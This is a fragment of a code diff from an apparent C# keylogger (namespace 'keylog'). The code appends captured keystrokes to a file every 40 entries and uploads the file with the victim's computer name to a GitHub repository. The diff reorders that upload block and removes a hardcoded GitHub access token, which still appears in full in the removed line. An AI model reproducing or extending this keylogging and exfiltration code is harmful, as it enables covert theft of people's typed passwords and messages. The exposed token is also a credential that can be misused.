@@ -61,10 +61,10 @@ namespace keylog
             
             if (count > 40)
             {
-                File.AppendAllText(path, tmp);
-                System.Threading.Thread.Sleep(1000);
-                upload(path, computer);
                 count = 0;
+                File.AppendAllText(path, tmp);
+                upload(path, computer);
+                
             }
             tmp = "";
         }
@@ -74,7 +74,7 @@ namespace keylog
             string githubUser = "Stalinisator";
             string githubRepo = "keylog";
             string githubBranch = "main";
-            string githubToken = "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";
+            string githubToken = "";
 
 
             var gitHubClient = new GitHubClient(new ProductHeaderValue(githubRepo));
